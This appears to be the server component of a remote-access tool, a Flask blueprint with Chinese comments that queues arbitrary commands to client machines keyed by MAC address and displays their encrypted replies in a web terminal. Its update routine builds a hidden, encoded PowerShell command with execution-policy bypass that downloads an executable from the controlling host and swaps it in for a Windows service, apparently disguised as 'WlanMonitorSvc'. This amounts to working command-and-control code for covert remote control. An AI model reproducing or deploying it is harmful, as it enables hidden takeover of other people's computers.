from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('terminal', __name__)


@bp.route('/terminal/<mac>')
def terminal_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "Device not found"
    TERMINAL_HTML = """
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Terminal - {{ info.name }} ({{ mac }})</title>
    <style>{{ admin_css|safe }}body{background:#0b1020;color:#8cff9a;font-family:Consolas,monospace}.terminal-shell{max-width:1180px;margin:0 auto;padding:16px 12px 90px}.terminal-panel{background:#05070d;border:1px solid #1f2937;border-radius:8px;padding:14px;min-height:65vh;white-space:pre-wrap;word-break:break-word}.header{border-color:#1f2937}.input-area{position:fixed;left:0;right:0;bottom:0;background:#111827;border-top:1px solid #374151;padding:10px;z-index:10}.input-row{max-width:1180px;margin:0 auto;display:flex;gap:8px}.input-row input{flex:1;background:#05070d;color:#8cff9a;border-color:#16a34a;font-family:Consolas,monospace}@media(max-width:640px){.input-row{flex-wrap:wrap}.input-row button{flex:1 1 calc(50% - 8px)}}.sys-msg{color:#9ca3af}</style></head>
    <body><main class="terminal-shell"><div class="header"><div><b>>_ {{ info.name }}</b><br><span class="subtle">{{ mac }} <span id="conn_status"></span></span></div><a class="btn muted" href="/">Back</a></div><div id="output" class="terminal-panel"><span class="sys-msg">Connecting and loading cached output...</span></div></main>
    <div class="input-area"><div class="input-row"><input type="text" id="cmd" placeholder="Command..." onkeydown="if(event.keyCode==13) sendCmd()"><button onclick="sendCmd()">Send</button><button class="muted" onclick="window.location.href='/'">Back</button></div></div>
    <script>
    function checkPing(){fetch('/api/ping/{{ mac }}').then(r=>r.json()).then(data=>{let st=document.getElementById('conn_status');if(data.status==='online'){st.innerHTML='Online';st.style.color='#16a34a'}else{st.innerHTML='Offline';st.style.color='#dc2626'}})}setInterval(checkPing,3000);checkPing();
    function fetchOutput(){fetch('/api/get_cmd_result/{{ mac }}').then(r=>r.json()).then(data=>{if(data.status==='ok'){var el=document.getElementById('output');if(el.textContent!==data.output){var bottom=(window.innerHeight+window.scrollY)>=(document.body.offsetHeight-50);el.textContent=data.output;if(bottom)window.scrollTo(0,document.body.scrollHeight)}}})}setInterval(fetchOutput,500);fetchOutput();
    function sendCmd(){var cmd=document.getElementById('cmd').value;if(!cmd)return;document.getElementById('cmd').value='';fetch('/api/send_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac:'{{ mac }}',cmd:cmd})}).then(()=>fetchOutput())}
    </script></body></html>
    """
    return render_template_string(TERMINAL_HTML, admin_css=ADMIN_CSS, mac=mac, info=clients_db[mac])

@bp.route('/cmd_result', methods=['POST'])
def cmd_result():
    mac = decrypt_data(request.form.get('mac', ''))
    output = decrypt_data(request.form.get('output', ''))
    if mac in clients_db:
        # 将最新的结果自动往后追加到这段历史记录里，并且截断过长的历史以节省空间
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"{output}\n")[-50000:];
        clients_db[mac]['is_executing'] = False;
        save_db()
    return "OK", 200

@bp.route('/api/send_cmd', methods=['POST'])
def api_send_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')

    if mac not in clients_db:
        return jsonify({"status": "error", "msg": "设备不存在"}), 404

    # 初始化该客户端的队列
    init_client_queue(mac)

    # 确定命令优先级（娱乐命令用 'normal'，重要命令用 'high'）
    priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'
    is_media_info_poll = (cmd == 'F_CMD:MEDIA_INFO:')
    if is_media_info_poll:
        priority = 'low'

    # 处理 UPDATE_NOW 特殊逻辑
    if cmd == 'UPDATE_NOW':
        import base64
        host_url = request.host_url.rstrip('/')
        def get_version(v_str):
            try: return [int(x) for x in v_str.strip().split('.')]
            except: return [0, 0, 0]
        client_ver = clients_db[mac].get('ver', '1.0.0')
        if get_version(client_ver) < [1, 6, 10]:
            ps_cmd = (
                "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                "if (-not $p) { exit }; "
                f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
            )
            ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
            cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
        priority = 'high'

    # 使用命令队列进行投递（返回布尔值表示是否成功入队）
    success = add_cmd_to_queue(mac, cmd, priority=priority)

    if not success:
        return jsonify({"status": "error", "msg": "命令队列已满，请稍后重试"}), 429

    # 记录到终端历史（用于展示）；媒体信息自动轮询不刷屏。
    if not is_media_info_poll:
        name = clients_db[mac].get('name', '未命名设备')
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
        clients_db[mac]['is_executing'] = True
        save_db()

    return jsonify({"status": "ok", "msg": "命令已入队，等待设备执行"})


@bp.route('/api/batch_cmd', methods=['POST'])
def api_batch_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    macs = data.get('macs', [])
    cmd = data.get('cmd', '')
    import base64
    host_url = request.host_url.rstrip('/')
    def get_version(v_str):
        try: return [int(x) for x in v_str.strip().split('.')]
        except: return [0, 0, 0]

    failed_macs = []
    for mac in macs:
        if mac not in clients_db:
            failed_macs.append(mac)
            continue

        init_client_queue(mac)

        # 确定命令优先级
        priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'

        # 处理 UPDATE_NOW 特殊逻辑
        final_cmd = cmd
        if cmd == 'UPDATE_NOW':
            client_ver = clients_db[mac].get('ver', '1.0.0')
            if get_version(client_ver) < [1, 6, 10]:
                ps_cmd = (
                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                    "if (-not $p) { exit }; "
                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
                )
                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
                final_cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
            priority = 'high'

        # 入队
        if not add_cmd_to_queue(mac, final_cmd, priority=priority):
            failed_macs.append(mac)
            continue

        name = clients_db[mac].get('name', '未命名设备')
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {final_cmd}\n")[-50000:]
        clients_db[mac]['is_executing'] = True

    save_db()

    if failed_macs:
        return jsonify({"status": "partial", "msg": f"部分设备入队失败: {', '.join(failed_macs)}", "failed": failed_macs}), 207
    return jsonify({"status": "ok", "msg": "所有命令已入队"})


@bp.route('/api/get_cmd_result/<mac>')
def api_get_cmd_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        hist = clients_db[mac].get('terminal_history', '尚未有历史执行记录\n')
        if clients_db[mac].get('is_executing', False):
            hist += "[系统指令已下发，等待终端执行与响应返回...] \n";
        return jsonify({"output": hist, "status": "ok"})
    return jsonify({"status": "not found"})
